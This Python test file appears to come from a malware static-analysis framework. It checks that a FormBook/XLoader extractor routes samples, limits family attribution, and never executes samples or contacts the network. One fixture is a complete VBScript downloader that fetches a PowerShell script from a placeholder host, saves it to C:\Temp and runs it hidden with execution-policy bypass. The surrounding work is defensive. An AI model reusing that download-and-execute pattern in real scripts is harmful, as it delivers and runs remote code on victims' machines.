"""通常FormBook routeと高度静的解析器の統合回帰。"""

from __future__ import annotations

import hashlib
import io
import sys
import zipfile
from pathlib import Path
from types import SimpleNamespace

import pytest

FRAMEWORK = Path(__file__).parents[1]
COMMON = FRAMEWORK / "common"
for trusted in (FRAMEWORK, COMMON):
    if str(trusted) not in sys.path:
        sys.path.insert(0, str(trusted))

from extractors.formbook import integrated
from handler_catalog import (
    clear_handler_caches,
    discover_handlers,
    execute_handler_bounded_for_assessment,
    preflight_handler_for_assessment,
    preflight_handler_runtime_import,
)

from malware.formbook_loader import extract_config as facade
from malware.formbook_loader.detect import detect


def _integrated_spec():
    return next(
        item
        for item in discover_handlers()
        if item.id == "formbook:extractors.formbook.integrated.py:extract"
    )


def _direct_vbscript_fixture() -> bytes:
    return b'''Option Explicit
Dim stageUrl, payloadPath, launchCommand
Dim fileSystem, shell, http, outputFile
stageUrl = "https://updates.example.test/content/secured_stub.ps1?token=redacted#section"
Set fileSystem = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")
payloadPath = "C:\\Temp\\fixture.ps1"
launchCommand = "powershell.exe -nop -ep bypass -file """ & payloadPath & """"
http.Open "GET", stageUrl, False
http.Send
Set outputFile = fileSystem.CreateTextFile(payloadPath, True)
outputFile.Write http.ResponseText
outputFile.Close
shell.Run launchCommand, 0, True
'''


def test_integrated_formbook_handler_is_automatic_and_dependency_audited() -> None:
    clear_handler_caches()
    spec = _integrated_spec()

    assert spec.automatic is True
    assert spec.input_formats == ("script", "data", "pe", "macho", "ole", "zip")
    assert spec.minimum_evidence_score == 20_000
    preflight = preflight_handler_for_assessment(
        spec,
        actual_format="script",
        input_size=len(_direct_vbscript_fixture()),
    )
    assert preflight["eligible"] is True, preflight["blockers"]
    assert preflight["blockers"] == []
    imported = preflight_handler_runtime_import(
        spec,
        static_preflight=preflight,
        timeout_seconds=30.0,
    )
    assert imported["eligible"] is True, imported["blockers"]
    assert imported["handler_imported"] is True
    assert imported["sample_execution_allowed"] is False
    assert imported["network_allowed"] is False
    assert imported["filesystem_write_allowed"] is False


def test_integrated_formbook_handler_preserves_route_only_boundary() -> None:
    bounded = execute_handler_bounded_for_assessment(
        _integrated_spec(),
        _direct_vbscript_fixture(),
        "fixture.vbs",
        actual_format="script",
        timeout_seconds=30.0,
    )

    assert bounded["status"] == "completed", bounded
    execution = bounded["execution"]
    result = execution["result"]
    assert result["family"] == "formbook"
    assert result["variant"] == "wsh_direct_http_powershell_downloader"
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["attribution_scope"] == "component_handler_route"
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["urls"] == [
        {
            "url": "https://updates.example.test/content/secured_stub.ps1",
            "role": "payload_stage",
            "query_present": True,
            "fragment_removed": True,
        }
    ]
    assert result["advanced_static_adapter"] == {
        "source_family": "formbook_loader",
        "source_supports_family_attribution": False,
        "source_terminal_family_confirmed": False,
        "family_promotion_allowed": False,
    }
    assert result["executed_sample"] is False
    assert result["network_contacted"] is False


def test_integrated_formbook_handler_keeps_no_evidence_unresolved() -> None:
    bounded = execute_handler_bounded_for_assessment(
        _integrated_spec(),
        b"MZ FormBook XLoader NtSetContextThread GetThreadContext",
        "unresolved.exe",
        actual_format="pe",
        timeout_seconds=30.0,
    )

    assert bounded["status"] == "completed", bounded
    execution = bounded["execution"]
    assert execution["result"]["status"] == "not_applicable"
    assert execution["verified_binary_outputs"] == []
    assert execution["executed_sample"] is False
    assert execution["network_contacted"] is False


def test_android_xloader_name_collision_does_not_route_to_formbook() -> None:
    """Android APKのXLoader同名ラベルをFormBook／XLoaderへ誤帰属しない。"""

    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as apk:
        apk.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00fixture")
        apk.writestr("classes.dex", b"dex\n038\x00fixture")
        apk.writestr("lib/armeabi-v7a/libloader.so", b"\x7fELF" + bytes(128))

    result = detect(archive.getvalue(), Path("provider-labelled-xloader.apk"))

    assert result["matched"] is False
    assert result["campaigns"] == []
    assert result["observations"]["reviewed_hash"] is False


def test_umbrella_native_lineage_does_not_promote_formbook_family(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """共通loader lineageを個別FormBook終端へ読み替えない。"""

    monkeypatch.setattr(
        integrated,
        "_extract_loader_component",
        lambda _data: {
            "matched": True,
            "family": "formbook_loader",
            "variant": "native_x86_two_stage_rc4",
            "supports_family_attribution": True,
            "terminal_family_confirmed": False,
            "attribution_scope": "native_loader_lineage_not_terminal_payload",
            "static_config_recovered": False,
            "c2": [],
            "limitations": [
                "XLoader／FormBook共通loader lineageだけを確認した"
            ],
            "executed_sample": False,
            "network_contacted": False,
        },
    )

    result = integrated.extract(b"synthetic", "synthetic.exe")

    assert result["family"] == "formbook"
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["attribution_scope"] == "component_handler_route"
    assert result["c2"] == []
    assert result["advanced_static_adapter"] == {
        "source_family": "formbook_loader",
        "source_supports_family_attribution": True,
        "source_terminal_family_confirmed": False,
        "family_promotion_allowed": False,
    }


def test_integrated_formbook_handler_preserves_static_chain_failure_reason() -> None:
    """曖昧なscript routeをworker障害に変換せず理由付きで保持する。"""

    ambiguous = _direct_vbscript_fixture().replace(
        b'http.Open "GET", stageUrl, False',
        b'http.Open "GET", stageUrl, False\n'
        b'http.Open "GET", "https://mirror.example.test/other.ps1", False',
    )
    bounded = execute_handler_bounded_for_assessment(
        _integrated_spec(),
        ambiguous,
        "ambiguous.vbs",
        actual_format="script",
        timeout_seconds=30.0,
    )

    assert bounded["status"] == "completed", bounded
    result = bounded["execution"]["result"]
    assert result["status"] == "not_applicable"
    assert "静的復元が部分的に失敗" in result["reason"]
    assert "URLが一意" in result["reason"]
    assert bounded["execution"]["executed_sample"] is False
    assert bounded["execution"]["network_contacted"] is False


def test_facade_routes_xor2f_terminal_memory_image_without_promotion(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    sample = b"MZ" + bytes(1022)
    recovered = b"\x55\x8b\xec" + bytes(509)
    recovered_sha256 = hashlib.sha256(recovered).hexdigest()
    report = {
        "schema_version": 1,
        "status": "native_memory_image_recovered",
        "variant": "xor2f_aes_png_x86_two_layer_rc4_memory_loader",
        "classification_scope": "packer_variant_only",
        "supports_family_attribution": False,
        "terminal_payload_recovered": False,
        "derived_payload_recovered": True,
        "artifact": {
            "role": "decrypted_native_memory_image",
            "format": "x86_raw_memory_image",
            "sha256": recovered_sha256,
            "size": len(recovered),
            "entry_offset": "0x2d080",
        },
        "c2": [],
        "static_config_recovered": False,
        "c2_recovery_status": "requires_follow_on_static_memory_image_analysis",
        "limitations": ["fixture"],
        "safety": {
            "sample_executed": False,
            "network_contacted": False,
            "raw_key_material_included": False,
        },
    }
    monkeypatch.setattr(
        facade,
        "recover_xor2f_native_memory_image",
        lambda _data: (report, [("decrypted_native_memory_image", recovered)]),
    )

    result = facade.extract_config(sample)

    assert result["variant"] == "xor2f_aes_png_x86_two_layer_rc4_memory_loader"
    assert result["supports_family_attribution"] is False
    assert result["terminal_family_confirmed"] is False
    assert result["static_config_recovered"] is False
    assert result["c2"] == []
    assert result["recovered_payload"] == {
        "role": "recovered_payload",
        "kind": "binary",
        "name": "formbook-loader-native-memory-image.bin",
        "data": recovered,
    }
    assert "derived_payloads" not in result


def test_reviewed_dotnet_child_is_non_terminal_recovered_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    child = b"MZ" + bytes(510)
    monkeypatch.setattr(facade, "decrypt_embedded_payload", lambda _data: child)
    monkeypatch.setattr(facade, "_resource_value", lambda _data: b"encrypted-fixture")

    result = facade._extract_reviewed_dotnet_config(b"fixture")

    assert result["terminal_payload_recovered"] is False
    assert result["recovered_payload"] == {
        "role": "recovered_payload",
        "kind": "pe",
        "name": "formbook-loader-managed-child.exe",
        "data": child,
    }
    assert "derived_payloads" not in result


def test_native_stage0_analysis_image_is_non_terminal_recovered_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    analysis_pe = b"MZ" + bytes(1022)
    recovered = SimpleNamespace(
        analysis_pe=analysis_pe,
        report={
            "profile": {"entry_offset": 128},
            "decrypted_stage_sha256": hashlib.sha256(b"stage").hexdigest(),
            "decrypted_stage_size": 5,
            "candidate_evaluation": {"attempt_count": 1},
        },
    )
    monkeypatch.setattr(facade, "recover_native_stage0", lambda _data: recovered)
    monkeypatch.setattr(
        facade,
        "_extract_native_xloader_inventory",
        lambda _data: (_ for _ in ()).throw(facade.HandlerNoEvidenceError("fixture")),
    )

    result = facade._extract_native_stage0_config(b"MZfixture")

    assert result["terminal_payload_recovered"] is False
    assert result["recovered_payload"] == {
        "role": "recovered_payload",
        "kind": "pe",
        "name": "formbook-loader-native-analysis.exe",
        "data": analysis_pe,
    }
    assert "derived_payloads" not in result
